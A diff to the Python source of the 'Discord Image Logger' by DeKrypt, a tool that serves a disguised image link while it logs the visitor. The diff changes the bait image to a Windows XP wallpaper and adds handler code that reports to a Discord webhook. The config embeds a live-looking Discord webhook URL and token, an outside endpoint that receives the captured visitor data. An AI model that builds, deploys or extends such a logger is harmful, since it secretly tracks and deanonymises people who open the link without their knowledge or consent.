@@ -1,4 +1,5 @@
-
+# Discord Image Logger
+# By DeKrypt | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
@@ -12,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1334833062298779648/1ARBrY4rb_ehPXAdqDNkKIL8e18Zkko-IWeBaKRI4Y1sEgrSjMukAxYKB7obvdrU1Ts1",
-    "image": "https://imgs.smoothradio.com/images/191589?crop=16_9&width=660&relax=1&format=webp&signature=Ml8WZAy9AcNFUlEbNVKxJTzqtJc=", # You can also have a custom image by using a URL argument
+    "image": "https://www.newegg.com/insider/wp-content/uploads/windows_xp_bliss-wide.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -285,3 +286,20 @@ if (!currenturl.includes("g=")) {
 }}
 
 </script>"""
+
+               self.wfile.write(data)
+        
+        except Exception:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            reportError(traceback.format_exc())
+
+        return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+handler = app = ImageLoggerAPI
